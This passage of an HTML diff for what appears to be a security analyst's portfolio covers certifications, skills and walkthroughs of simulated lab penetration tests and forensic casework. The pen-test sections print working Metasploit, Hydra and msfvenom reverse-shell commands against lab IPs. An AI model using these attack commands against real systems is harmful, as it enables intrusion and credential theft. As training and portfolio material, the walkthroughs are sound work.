+        <span class="cert-badge">SC-200</span>
+        <span class="cert-issuer">Microsoft</span>
+      </div>
+      <div class="cert-title">Microsoft Security Operations Analyst</div>
+      <div class="cert-desc">The SOC analyst certification. Covers Microsoft Sentinel (SIEM), Microsoft Defender XDR, threat detection rules, KQL hunting queries and end-to-end incident response. Aligned to L1/L2 SOC work.</div>
+    </div>
+
+    <div class="cert">
+      <div class="cert-header">
+        <span class="cert-badge">CEH v11</span>
+        <span class="cert-issuer">EC-Council</span>
+      </div>
+      <div class="cert-title">Certified Ethical Hacker</div>
+      <div class="cert-desc">Attacker-perspective certification covering reconnaissance, enumeration, exploitation, privilege escalation and post-exploitation across Linux and Windows. Understanding what an attacker just did makes alert analysis sharper.</div>
+    </div>
+
+    <div class="cert">
+      <div class="cert-header">
+        <span class="cert-badge">MSc</span>
+        <span class="cert-issuer">University of Portsmouth</span>
+      </div>
+      <div class="cert-title">Cybersecurity &amp; Forensic Information Technology  ·  Merit</div>
+      <div class="cert-desc">Coursework spanning penetration testing, digital forensics, incident response, cryptography, network security and information security management. I produced four substantive technical reports as part of the programme.</div>
+    </div>
+
+    <div class="cert">
+      <div class="cert-header">
+        <span class="cert-badge">BSc</span>
+        <span class="cert-issuer">Landmark University</span>
+      </div>
+      <div class="cert-title">Computer Science  ·  2:1</div>
+      <div class="cert-desc">Computer Science foundation with programming, systems architecture, networking, databases and software engineering. This is the technical base the MSc was built on.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     SKILLS
+═══════════════════════════════════════════════ -->
+<div class="section" id="skills">
+  <div class="section-label">// Skills</div>
+  <div class="section-title">Technical capability</div>
+  <p class="section-subtitle">Grouped by job-description function. Every entry is something I've used in lab or live work documented in this portfolio.</p>
+
+  <div class="skills-grid">
+
+    <div class="skill-group">
+      <div class="skill-group-title">Threat Detection &amp; Monitoring</div>
+      <ul class="skill-list">
+        <li>SIEM alert triage (Microsoft Sentinel)</li>
+        <li>KQL query writing</li>
+        <li>IOC identification</li>
+        <li>Brute-force pattern recognition</li>
+        <li>Port scan / TCP flag analysis</li>
+        <li>auth.log / syslog review</li>
+        <li>MITRE ATT&amp;CK familiarity</li>
+      </ul>
+    </div>
+
+    <div class="skill-group">
+      <div class="skill-group-title">Incident Response &amp; Forensics</div>
+      <ul class="skill-list">
+        <li>Incident triage &amp; escalation</li>
+        <li>Forensic imaging (FTK Imager)</li>
+        <li>Mobile forensics (XAMN, XRY)</li>
+        <li>Disk forensics (Autopsy)</li>
+        <li>Hash verification (MD5, SHA1)</li>
+        <li>Chain of custody handling</li>
+        <li>Court-admissible reporting</li>
+      </ul>
+    </div>
+
+    <div class="skill-group">
+      <div class="skill-group-title">Network &amp; Endpoint Security</div>
+      <ul class="skill-list">
+        <li>Wireshark packet analysis</li>
+        <li>Suricata IDS rule writing</li>
+        <li>iptables firewall configuration</li>
+        <li>Nmap NSE scanning</li>
+        <li>EDR (Kaspersky, Microsoft Defender)</li>
+        <li>ZTNA architecture</li>
+        <li>TCP/IP, DNS, DHCP fundamentals</li>
+      </ul>
+    </div>
+
+    <div class="skill-group">
+      <div class="skill-group-title">Vulnerability &amp; Pen Test</div>
+      <ul class="skill-list">
+        <li>Metasploit Framework</li>
+        <li>Hydra brute-force testing</li>
+        <li>msfvenom payload generation</li>
+        <li>CVE / CVSS v3 / CWE classification</li>
+        <li>EternalBlue, SambaCry exploitation</li>
+        <li>Privilege escalation (Linux &amp; Windows)</li>
+        <li>Vulnerability remediation guidance</li>
+      </ul>
+    </div>
+
+    <div class="skill-group">
+      <div class="skill-group-title">GRC &amp; Compliance</div>
+      <ul class="skill-list">
+        <li>NIST SP 800-63B</li>
+        <li>OWASP Top 10</li>
+        <li>NCSC 10 Steps to Cyber Security</li>
+        <li>ACPO Good Practice Guidelines</li>
+        <li>PCI-DSS, GDPR, NDPR</li>
+        <li>Risk-to-business-impact mapping</li>
+        <li>Security policy &amp; proposal writing</li>
+      </ul>
+    </div>
+
+    <div class="skill-group">
+      <div class="skill-group-title">Tools &amp; Operations</div>
+      <ul class="skill-list">
+        <li>Kali Linux / Ubuntu</li>
+        <li>Windows Server / Windows 7-11</li>
+        <li>ServiceNow ITSM</li>
+        <li>Microsoft 365 / Sentinel / Defender</li>
+        <li>Trellix DLP / DAM</li>
+        <li>Ivanti Neurons MDM</li>
+        <li>Commvault Backup &amp; Recovery</li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     PROJECTS
+═══════════════════════════════════════════════ -->
+<div class="section" id="projects">
+  <div class="section-label">// Featured projects</div>
+  <div class="section-title">Five documented project walkthroughs</div>
+  <p class="section-subtitle">Each project follows the same five-part structure: scenario, methodology, findings and IOCs, mistakes and dead ends, lessons learned. No summaries, just technical detail with commands, timestamps and outputs.</p>
+</div>
+
+<!-- ════════════ PROJECT 01 ════════════ -->
+<div class="section">
+  <div class="section-label">// Project 01</div>
+  <div class="section-title">Linux Server Penetration Test</div>
+
+  <div class="project-meta">
+    <span>Role: Penetration Tester</span>
+    <span>·</span>
+    <span class="project-applies">
+      <span class="project-applies-label">Applies to:</span>
+      <span class="role-pill role-pill-soc">SOC</span>
+      <span class="role-pill role-pill-an">Analyst</span>
+    </span>
+  </div>
+
+  <div class="tool-strip">
+    <span class="tool">Nmap 7.80</span>
+    <span class="tool">enum4linux v0.9.1</span>
+    <span class="tool">Hydra v9.0</span>
+    <span class="tool">Metasploit v6.3.9</span>
+    <span class="tool">PostgreSQL CLI</span>
+    <span class="tool">strings</span>
+    <span class="tool">SSH</span>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">1  ·  Scenario</div>
+    <div class="walk-title">What was being investigated and why</div>
+    <div class="callout scenario"><strong>Client</strong>Frozen Yoghurt Ltd (simulated client engagement)</div>
+    <div class="callout scenario"><strong>Objective</strong>Black-box pen test against the client's Linux server. No prior knowledge of services, users or credentials. The goal was to find exploitable vulnerabilities and produce a professional client report.</div>
+    <p>Simulated an external attacker with only the target IP <strong>192.168.197.130</strong>. The attacker machine was a Kali-based Ubuntu VM at <strong>192.168.197.128</strong>. Isolated lab network. Every command and observation was documented.</p>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">2  ·  Methodology</div>
+    <div class="walk-title">Every step, and why I took it</div>
+    <p>Standard lifecycle: <strong>Reconnaissance → Enumeration → Exploitation → Privilege Escalation → Post-Exploitation → Reporting</strong>.</p>
+
+    <h4>Phase 1: Reconnaissance &amp; Port Scanning</h4>
+    <div class="code">nmap -sV -sC -O 192.168.197.130</div>
+    <p>Open ports: 22 (SSH), 139/445 (Samba), 5432 (PostgreSQL 9.3.4). PostgreSQL version immediately flagged as outdated.</p>
+
+    <h4>Phase 2: User Enumeration via enum4linux</h4>
+    <div class="code">enum4linux 192.168.197.130</div>
+    <p>Three accounts extracted via SID enumeration:</p>
+    <ul>
+      <li><code>frozen</code> (S-1-22-1-1000)</li>
+      <li><code>admin</code> (S-1-22-1-1001)</li>
+      <li><code>postfixuser</code> (S-1-22-1-1002)</li>
+    </ul>
+    <p>Selected <strong>frozen</strong> as primary target. Matching the client name is a common avoidable mistake.</p>
+
+    <h4>Phase 3: SSH Brute Force (CWE-1391)</h4>
+    <div class="code">hydra -l frozen -P rockyou.txt 192.168.197.130 ssh</div>
+    <p>After 104 attempts a valid credential was found:</p>
+    <div class="callout found"><strong>Credential Found</strong>Username: <code>frozen</code>  ·  Password: <code>frozenyougert</code></div>
+
+    <h4>Phase 4: Initial Access &amp; Privilege Escalation</h4>
+    <div class="code">ssh frozen@192.168.197.130
+whoami   <span class="cmt">→ frozen</span>
+
+sudo cat mypasswd.txt
+<span class="err">frozen is not in the sudoers file. This incident will be reported.</span>
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+whoami   <span class="ok">→ root</span></div>
+
+    <h4>Phase 5: Plaintext Password in Binary (CWE-256)</h4>
+    <div class="code">strings ProcessChecker
+Check current running processes here. Needs password :)
+What is the password?
+Hint: bash meets rockyou!!!
+<span class="hl">bashment</span>
+Correct</div>
+    <div class="callout found"><strong>Credential Found</strong>ProcessChecker password <code>bashment</code> hardcoded in ELF binary.</div>
+
+    <h4>Phase 6: Samba RCE via CVE-2017-7494 (SambaCry)</h4>
+    <div class="code">use exploit/linux/samba/is_known_pipename
+set RHOST 192.168.197.130
+run
+
+<span class="ok">[*] Command shell session 1 opened (192.168.197.128:33589 -> 192.168.197.130:445) at 2023-04-26 09:39:14 -0700</span>
+whoami  <span class="ok">→ root</span></div>
+
+    <h4>Phase 7: PostgreSQL Default Creds + RCE (CVE-2019-9193)</h4>
+    <div class="code">hydra -l postgres -P rockyou.txt 192.168.197.130 postgres
+<span class="ok">[5432][postgres] login: postgres   password: postgres</span>
+
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+set RHOST 192.168.197.130 ; set LHOST 192.168.197.128
+check  <span class="ok">→ The target appears to be vulnerable.</span>
+run
+
+<span class="ok">[*] Command shell session 2 opened at 2023-04-26 09:46:36 -0700</span>
+whoami  <span class="ok">→ postgres</span></div>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">3  ·  Findings &amp; IOCs</div>
+    <div class="walk-title">Screenshots, IOCs, timelines, log snippets</div>
+    <table class="ioc">
+      <thead><tr><th>ID</th><th>Finding</th><th>Severity</th><th>CVSS</th></tr></thead>
+      <tbody>
+        <tr><td><span class="cve-id">CVE-2017-7494</span></td><td>Samba RCE: is_known_pipename</td><td><span class="sev sev-c">CRITICAL</span></td><td><span class="cvss-c">9.8</span></td></tr>
+        <tr><td><span class="cve-id">CWE-1391</span></td><td>Weak / reused SSH credential</td><td><span class="sev sev-h">HIGH</span></td><td><span class="cvss-h">8.4</span></td></tr>
+        <tr><td><span class="cve-id">CWE-256</span></td><td>Plaintext password in binary</td><td><span class="sev sev-h">HIGH</span></td><td><span class="cvss-h">8.1</span></td></tr>
+        <tr><td><span class="cve-id">CVE-2019-9193</span></td><td>PostgreSQL authenticated RCE</td><td><span class="sev sev-h">HIGH</span></td><td><span class="cvss-h">7.2</span></td></tr>
+        <tr><td><span class="cve-id">CWE-1392</span></td><td>Default PostgreSQL credentials</td><td><span class="sev sev-h">HIGH</span></td><td><span class="cvss-h">7.3</span></td></tr>
+      </tbody>
+    </table>
+    <ul>
+      <li>Credential reuse: <code>frozen / frozenyougert</code> valid on both SSH and (via hash cracking) Windows server</li>
+      <li>CVE-2017-7494 payload path: <code>\\192.168.197.130\frozen\uMtccase.so</code></li>
+      <li>Shell timestamps: Samba RCE = <code>2023-04-26 09:39:14</code>  ·  PostgreSQL RCE = <code>2023-04-26 09:46:36</code></li>
+    </ul>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">4  ·  Mistakes &amp; Dead Ends</div>
+    <div class="walk-title">Wrong assumptions and false starts</div>
+    <div class="callout warn"><strong>Dead End</strong>Attempted sudo on the frozen account before checking the sudoers file. The failure was logged server-side and in a real engagement that would be a defender alert. Privilege context should be established before noisy actions.</div>
+    <div class="callout warn"><strong>Mistake</strong>Initially ran Hydra with default parallel threads. Hydra itself warned SSH limits parallel tasks and recommended <code>-t 4</code>. Ignoring this risked lockouts.</div>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">5  ·  Lessons Learned</div>
+    <div class="walk-title">What I'd do differently and what it taught me</div>
+    <div class="callout lesson"><strong>Lesson</strong>Password reuse across services is catastrophic. One weak password gave access to two systems. Defensive controls must enforce uniqueness per service.</div>
+    <div class="callout lesson"><strong>Lesson</strong>Default credentials are immediate-exploit territory. Post-deployment hardening must include rotation on every service before go-live.</div>
+    <div class="callout lesson"><strong>Lesson</strong>Hardcoded passwords in binaries fail at the first hurdle. Secrets belong in env vars or vaults, never in compiled code.</div>
+  </div>
+</div>
+
+<!-- ════════════ PROJECT 02 ════════════ -->
+<div class="section">
+  <div class="section-label">// Project 02</div>
+  <div class="section-title">Windows Server Penetration Test</div>
+
+  <div class="project-meta">
+    <span>Role: Penetration Tester</span>
+    <span>·</span>
+    <span class="project-applies">
+      <span class="project-applies-label">Applies to:</span>
+      <span class="role-pill role-pill-soc">SOC</span>
+      <span class="role-pill role-pill-an">Analyst</span>
+    </span>
+  </div>
+
+  <div class="tool-strip">
+    <span class="tool">Nmap 7.80</span>
+    <span class="tool">Metasploit v6.3.9</span>
+    <span class="tool">msfvenom</span>
+    <span class="tool">hashdump</span>
+    <span class="tool">hashes.com</span>
+    <span class="tool">EternalBlue</span>
+    <span class="tool">bypassuac</span>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">1  ·  Scenario</div>
+    <div class="walk-title">What was being investigated and why</div>
+    <div class="callout scenario"><strong>Objective</strong>Full pen test against the client's Windows Server in the same engagement window as the Linux server. The goal was to exploit identified CVEs, extract credentials, escalate to SYSTEM and check for cross-system credential reuse.</div>
+    <p>Target: <strong>192.168.197.134</strong> (Windows 7 Professional N SP1 x64). Attacker: <strong>192.168.197.128</strong>.</p>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">2  ·  Methodology</div>
+    <div class="walk-title">Every step, and why I took it</div>
+
+    <h4>Phase 1: Reconnaissance &amp; CVE Identification</h4>
+    <div class="code">nmap -sV --script vuln 192.168.197.134
+
+smb-vuln-ms17-010:
+  <span class="err">VULNERABLE</span>
+  State: VULNERABLE
+  IDs: CVE:CVE-2017-0143
+  Risk factor: HIGH
+  Disclosure date: 2017-03-14</div>
+
+    <h4>Phase 2: EternalBlue Exploitation (CVE-2017-0144)</h4>
+    <div class="code">use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.197.134 ; set LHOST 192.168.197.128
+run
+
+<span class="ok">[*] Meterpreter session 1 opened (192.168.197.128:4444 -> 192.168.197.134:49183) at 2023-04-25 08:36:19 -0700</span>
+meterpreter > getuid
+Server username: <span class="ok">NT AUTHORITY\SYSTEM</span></div>
+
+    <h4>Phase 3: Credential Extraction &amp; Hash Cracking (CWE-328)</h4>
+    <div class="code">meterpreter > hashdump
+frozen:1000:aad3b435b51404eeaad3b435b51404ee:<span class="hl">62a78619be9d4d7c47bb6d4c2f3a20f6</span>:::</div>
+    <div class="callout found"><strong>Hash Cracked</strong><code>62a78619be9d4d7c47bb6d4c2f3a20f6</code>  →  <code>frozenyougert</code></div>
+    <p>Confirmed credential reuse between Linux SSH and Windows server. Other accounts in dump: <code>Administrator, backup, Bart, Guest, HomeGroupUser$, Jane, Simon</code>.</p>
+
+    <h4>Phase 4: Physical Security Finding (CWE-200)</h4>
+    <p>Desktop sticky note widget contained 9 password-style strings. Classic social engineering risk.</p>
+
+    <h4>Phase 5: UAC Bypass &amp; SYSTEM (CVE-2019-1388)</h4>
+    <div class="code">msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=192.168.197.128 LPORT=5555 -f exe > payload.exe
+
+use exploit/windows/local/bypassuac
+set SESSION 1
+run
+<span class="ok">[*] Meterpreter session 2 opened at 2023-04-28 03:46:09 -0700</span>
+
+meterpreter > getsystem
+...got system via technique 1 (<span class="hl">Named Pipe Impersonation</span>)
+meterpreter > getuid → <span class="ok">NT AUTHORITY\SYSTEM</span></div>
+
+    <h4>Phase 6: Firewall Audit (CWE-693)</h4>
+    <div class="callout critical"><strong>Finding</strong>Windows Firewall: <strong>OFF</strong>. All inbound and outbound traffic flowing without inspection.</div>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">3  ·  Findings, Timeline &amp; IOCs</div>
+    <div class="walk-title">Evidence and attack chronology</div>
+
+    <h4>Attack Timeline</h4>
+    <div class="timeline-list">
+      <div class="timeline-item"><div class="timeline-time">2023-04-25 08:36:19</div><div class="timeline-event">EternalBlue executed → NT AUTHORITY\SYSTEM shell opened</div></div>
+      <div class="timeline-item"><div class="timeline-time">2023-04-25 08:36:19</div><div class="timeline-event">hashdump → NTLM hashes for 8 accounts extracted</div></div>
+      <div class="timeline-item"><div class="timeline-time">2023-04-25 ~08:40</div><div class="timeline-event">Hash cracked on hashes.com → <code>frozenyougert</code></div></div>
+      <div class="timeline-item"><div class="timeline-time">2023-04-28 03:46:09</div><div class="timeline-event">bypassuac payload executed → second SYSTEM session</div></div>
+    </div>
+
+    <table class="ioc">
+      <thead><tr><th>ID</th><th>Finding</th><th>Severity</th><th>CVSS</th></tr></thead>
+      <tbody>
+        <tr><td><span class="cve-id">CWE-328</span></td><td>Weak Hash: MD5/NTLM password storage</td><td><span class="sev sev-c">CRITICAL</span></td><td><span class="cvss-c">9.8</span></td></tr>
+        <tr><td><span class="cve-id">CVE-2017-0144</span></td><td>EternalBlue: SMBv1 RCE</td><td><span class="sev sev-h">HIGH</span></td><td><span class="cvss-h">8.1</span></td></tr>
+        <tr><td><span class="cve-id">CWE-200</span></td><td>Plaintext password on desktop</td><td><span class="sev sev-h">HIGH</span></td><td><span class="cvss-h">8.4</span></td></tr>
+        <tr><td><span class="cve-id">CVE-2019-1388</span></td><td>UAC Privilege Escalation</td><td><span class="sev sev-h">HIGH</span></td><td><span class="cvss-h">7.8</span></td></tr>
+        <tr><td><span class="cve-id">CWE-693</span></td><td>Windows Firewall disabled</td><td><span class="sev sev-m">MEDIUM</span></td><td><span class="cvss-m">6.7</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">4  ·  Mistakes &amp; Dead Ends</div>
+    <div class="walk-title">Wrong assumptions and false positives</div>
+    <div class="callout warn"><strong>Mistake</strong>Initially ran EternalBlue without the <code>ms17_010</code> check module first. Skipping the check risks running a destructive exploit on a non-vulnerable host. <em>Always run check before run.</em></div>
+    <div class="callout warn"><strong>False Positive</strong>The sticky note strings were initially treated as active system passwords. Further analysis suggested they may be external account reminders. Each should be tested against accessible services before drawing conclusions.</div>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">5  ·  Lessons Learned</div>
+    <div class="walk-title">What I'd do differently</div>
+    <div class="callout lesson"><strong>Lesson</strong>EternalBlue was disclosed years ago. Finding it unpatched on a modern system shows how long critical CVEs persist in real environments. Patch management is the highest-impact preventive control.</div>
+    <div class="callout lesson"><strong>Lesson</strong>NTLM hashing offers no real protection against offline cracking. Stronger algorithms and Credential Guard should be default.</div>
+    <div class="callout lesson"><strong>Lesson</strong>Sticky notes aren't a technical vulnerability. They're behaviour. Awareness training and password managers are the right countermeasures.</div>
+  </div>
+</div>
+
+<!-- ════════════ PROJECT 03 ════════════ -->
+<div class="section">
+  <div class="section-label">// Project 03</div>
+  <div class="section-title">Digital Forensics Court Report: R v Boyler</div>
+
+  <div class="project-meta">
+    <span>Role: Digital Forensics Examiner</span>
+    <span>·</span>
+    <span class="project-applies">
+      <span class="project-applies-label">Applies to:</span>
+      <span class="role-pill role-pill-an">Analyst</span>
+      <span class="role-pill role-pill-grc">GRC</span>
+    </span>
+  </div>
+
+  <div class="tool-strip">
+    <span class="tool">FTK Imager v4.7.1.2</span>
+    <span class="tool">XAMN v7.3.0</span>
+    <span class="tool">Autopsy 4.17.0</span>
+    <span class="tool">XRY</span>
+    <span class="tool">MD5 / SHA1</span>
+    <span class="tool">ACPO Guidelines</span>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">1  ·  Scenario</div>
+    <div class="walk-title">What was being investigated and why</div>
+    <div class="callout scenario"><strong>Case</strong>R v Matthew Boyler. Case Numbers CP230120/BOY003 and DD230120/BOY004</div>
+    <div class="callout scenario"><strong>Allegations</strong>Drug distribution and possession of indecent material. The suspect had a known drug dealer (Anthony) in his contacts. His girlfriend Cristina and her brother Alexander also had access to his devices.</div>
+    <p>Examination of four digital artefacts seized from the suspect's residence in Portsmouth. ACPO-compliant procedures throughout. All artefacts were imaged and centralised before analysis.</p>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">2  ·  Methodology</div>
+    <div class="walk-title">Every step, and why I took it</div>
+
+    <h4>Artefact intake &amp; chain of custody</h4>
+    <ul>
+      <li><code>CM/20BPA/15</code>: Digital Camera (no relevant data)</li>
+      <li><code>CM/20BPA/16</code>: TomTom Go 950</li>
+      <li><code>CM/20BPA/17</code>: Huawei Nexus 6P A2 TD-LTE H1512</li>
+      <li><code>CM/20BPA/18</code>: Hard Disk / USB (Windows XP images)</li>
+    </ul>
+
+    <h4>Mobile analysis of the Huawei Nexus 6P</h4>
+    <dl class="kv">
+      <dt>IMEI</dt><dd>867982021829511</dd>
+      <dt>ICCID</dt><dd>8944260907113483715</dd>
+      <dt>IMSI</dt><dd>23426  ·  Lycamobile</dd>
+      <dt>SHA1 (image)</dt><dd>2db79959bbb993e9cc377ef52540001ab3322682</dd>
+    </dl>
+
+    <h4>Disk image hashes (integrity verified)</h4>
+    <dl class="kv">
+      <dt>Image 1 MD5</dt><dd>47450864f2bb0b0b2bcd5f67803fbe0a</dd>
+      <dt>Image 2 MD5</dt><dd>5cb31c08937136694522978275139628</dd>
+    </dl>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">3  ·  Findings, Evidence &amp; Timelines</div>
+    <div class="walk-title">IOCs and recovered artefacts</div>
+
+    <h4>GPS data from the Huawei Nexus 6P</h4>
+    <div class="timeline-list">
+      <div class="timeline-item"><div class="timeline-time">6/8/2019 10:43:59</div><div class="timeline-event">Lat 50.801769  Long -1.088639  (Portsmouth)</div></div>
+      <div class="timeline-item"><div class="timeline-time">6/18/2019 13:56:05</div><div class="timeline-event">Lat 50.798553  Long -1.098356  (Portsmouth)</div></div>
+    </div>
+
+    <div class="callout found"><strong>Key Finding: Deleted Contact Recovered</strong>Display Name: <code>Anth</code>. Tel: <code>07448780515</code>. WhatsApp ID: <code>447448780515@s.whatsapp.net</code>. Deliberate deletion of a known drug dealer's contact is behaviourally significant but insufficient alone to prove involvement.</div>
+
+    <h4>Disk images: evidence paths</h4>
+    <ul>
+      <li><code>root/Program Files/RECYCLER/S-1-5-21-1085031214-1580818891-1202664/Dc1.jpg</code></li>
+      <li><code>root/Documents and Settings/All Users/Application Data/Microsoft/Network/Downloader</code></li>
+    </ul>
+    <div class="callout warn"><strong>Attribution Note</strong>One image carried metadata indicating download from <code>flickr.com</code> with credit to <code>thenaughtyamerican.com</code>. Multiple users had machine access so attribution to one user could not be established.</div>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">4  ·  Mistakes &amp; Dead Ends</div>
+    <div class="walk-title">What went wrong and what didn't pan out</div>
+    <div class="callout warn"><strong>Mistake</strong>Autopsy was run expecting corroborating results but returned no findings. Time was spent confirming tool limitation rather than examiner error.</div>
+    <div class="callout warn"><strong>Dead End</strong>Tinder account flagged as potentially relevant. Further extraction yielded no messages or metadata. Noted but added no evidential value.</div>
+    <div class="callout warn"><strong>Complexity</strong>Multiple users on the XP machine made file attribution genuinely difficult. Shared system paths (RECYCLER, All Users) cannot be attributed to one user without access logs.</div>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">5  ·  Lessons Learned</div>
+    <div class="walk-title">What I'd do differently</div>
+    <div class="callout lesson"><strong>Lesson</strong>Forensic objectivity is not optional. It's legally required. The report concluded no direct evidence of personal involvement could be established. Overstating evidence on multi-user devices risks an inadmissible report.</div>
+    <div class="callout lesson"><strong>Lesson</strong>GPS data without timestamps is of limited evidential value. Always extract timestamp metadata alongside coordinates and document explicitly when timestamps are absent.</div>
+    <div class="callout lesson"><strong>Lesson</strong>The deleted Anthony contact is the most interesting finding. Deliberate deletion is behaviourally significant. A full deletion timeline would strengthen the analytical picture in future cases.</div>
+  </div>
+</div>
+
+<!-- ════════════ PROJECT 04 ════════════ -->
+<div class="section">
+  <div class="section-label">// Project 04</div>
+  <div class="section-title">Mobile Forensics: Multi-Device Drug Investigation</div>
+
+  <div class="project-meta">
+    <span>Role: Mobile Forensics Specialist</span>
+    <span>·</span>
+    <span class="project-applies">
+      <span class="project-applies-label">Applies to:</span>
+      <span class="role-pill role-pill-an">Analyst</span>
+      <span class="role-pill role-pill-grc">GRC</span>
+    </span>
+  </div>
+
+  <div class="tool-strip">
+    <span class="tool">XAMN Viewer 7.3.0</span>
+    <span class="tool">FTK Imager 4.7.1.2</span>
+    <span class="tool">ACPO Guidelines</span>
+    <span class="tool">Misuse of Drugs Act 1971</span>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">1  ·  Scenario</div>
+    <div class="walk-title">What was being investigated and why</div>
+    <div class="callout scenario"><strong>Case</strong>Drug distribution investigation. Suspect in possession of four mobile phones, around 100 unidentified pills and a small bag of cannabis.</div>
+    <div class="callout scenario"><strong>Objective</strong>Identify the owner of each device, establish communications between suspects, decode coded language and produce a court-admissible report with a recommendation.</div>
+    <p>Four devices seized by PC Holmes and PC Watson. Examined under ACPO compliance.</p>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">2  ·  Methodology</div>
+    <div class="walk-title">Every step, and why I took it</div>
+
+    <table class="ioc">
+      <thead><tr><th>Exhibit</th><th>Device</th><th>IMEI</th><th>Owner</th></tr></thead>
+      <tbody>
+        <tr><td><span class="cve-id">File 1</span></td><td>Sony Xperia X</td><td><code>358098072780903</code></td><td><strong style="color:#e8edf5">Vic</strong></td></tr>
+        <tr><td><span class="cve-id">File 2</span></td><td>Samsung Galaxy S7 Edge</td><td><code>358809076140518</code></td><td><strong style="color:#e8edf5">Jon</strong></td></tr>
+        <tr><td><span class="cve-id">File 3</span></td><td>Sony Xperia Z5</td><td><code>354187077019492</code></td><td><strong style="color:#e8edf5">Lou</strong></td></tr>
+        <tr><td><span class="cve-id">File 4</span></td><td>Apple iPhone 6s</td><td><code>355770074250563</code></td><td><strong style="color:#e8edf5">Tony</strong></td></tr>
+      </tbody>
+    </table>
+    <p>Owner identities were established through cross-device analysis. They were not known at the start.</p>
+
+    <h4>GPS timeline from the Sony Xperia X</h4>
+    <div class="timeline-list">
+      <div class="timeline-item"><div class="timeline-time">08:47:48</div><div class="timeline-event">Portsmouth (starting location)</div></div>
+      <div class="timeline-item"><div class="timeline-time">08:52:09</div><div class="timeline-event">Isle of Wight car ferry terminal</div></div>
+      <div class="timeline-item"><div class="timeline-time">08:56:48</div><div class="timeline-event">Anglesea Road, Portsmouth</div></div>
+      <div class="timeline-item"><div class="timeline-time">08:59:41</div><div class="timeline-event">M275, leaving Portsmouth</div></div>
+      <div class="timeline-item"><div class="timeline-time">09:43:56</div><div class="timeline-event">Arundel</div></div>
+      <div class="timeline-item"><div class="timeline-time">13:21:38</div><div class="timeline-event">Hastings</div></div>
+    </div>
+
+    <h4>Identity establishment</h4>
+    <ul>
+      <li><strong>Vic</strong> (Sony Xperia X): Signed-off SMS "Vic"; GPS Portsmouth → Hastings 12/04/2019</li>
+      <li><strong>Jon</strong> (Samsung Galaxy S7): Incoming SMS from Vic addressed recipient as "Jon"</li>
+      <li><strong>Lou</strong> (Sony Xperia Z5): WhatsApp linked to <code>447851877483</code> &amp; email <code>loumfip@gmail.com</code></li>
+      <li><strong>Tony</strong> (iPhone 6s): WhatsApp group creator. Group metadata listed all four participants by name</li>
+    </ul>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">3  ·  Findings &amp; Network Map</div>
+    <div class="walk-title">The complete suspect network</div>
+    <ul>
+      <li>"Pizza party" language used by all four suspects, identified as coded drug transaction terminology through cross-device correlation</li>
+      <li>Tony's WhatsApp group included all four suspects with names and numbers, confirming identities in a single artefact</li>
+      <li>The Tony to Lou conversation contained: <em>"remember me to send you few lists"</em> followed by food item references</li>
+      <li>Lou's GPS placed device at University of Portsmouth on the arrest date at 14:21:58</li>
+      <li>Tony's iPhone connected to <code>eduroam</code> WiFi, linking suspect to a university environment</li>
+    </ul>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">4  ·  Mistakes &amp; Dead Ends</div>
+    <div class="walk-title">Where the investigation didn't go to plan</div>
+    <div class="callout warn"><strong>Dead End</strong>Attempted to extract GPS from the Samsung Galaxy S7. XAMN returned nothing. Initially suspected a configuration issue but GPS logging was simply disabled on the device.</div>
+    <div class="callout warn"><strong>Mistake</strong>Early analysis treated each device in isolation. The iPhone 6s WhatsApp group metadata that confirmed all four identities at once was discovered last. Cross-correlation should start from the first artefact.</div>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">5  ·  Lessons Learned</div>
+    <div class="walk-title">What I took forward</div>
+    <div class="callout lesson"><strong>Lesson</strong>Cross-device correlation is the most powerful technique in multi-suspect investigations. A single group chat resolved ownership of all four phones. Look for shared artefacts like group chats, common contacts and shared location data early.</div>
+    <div class="callout lesson"><strong>Lesson</strong>Coded language needs conservative interpretation. Document the pattern, note its consistency and let the court draw conclusions supported by physical evidence. Never claim coded meaning as fact.</div>
+    <div class="callout lesson"><strong>Lesson</strong>GPS timestamps are more evidentially valuable than locations alone. Always consider how opposing counsel will read each finding.</div>
+  </div>
+</div>
+
+<!-- ════════════ PROJECT 05 ════════════ -->
+<div class="section">
+  <div class="section-label">// Project 05</div>
+  <div class="section-title">Enterprise Security Consultancy at CyberSync Hub</div>
+
+  <div class="project-meta">
+    <span>Role: Security Analyst (Consultancy)</span>
+    <span>·</span>
+    <span class="project-applies">
+      <span class="project-applies-label">Applies to:</span>
+      <span class="role-pill role-pill-an">Analyst</span>
+      <span class="role-pill role-pill-grc">GRC</span>
+    </span>
+  </div>
+
+  <div class="tool-strip">
+    <span class="tool">Kaspersky EDR</span>
+    <span class="tool">Trellix DLP / DAM</span>
+    <span class="tool">Ivanti Neurons MDM</span>
+    <span class="tool">Commvault</span>
+    <span class="tool">ZTNA</span>
+    <span class="tool">PCI-DSS · GDPR · NDPR</span>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">1  ·  Scenario</div>
+    <div class="walk-title">What this work involves</div>
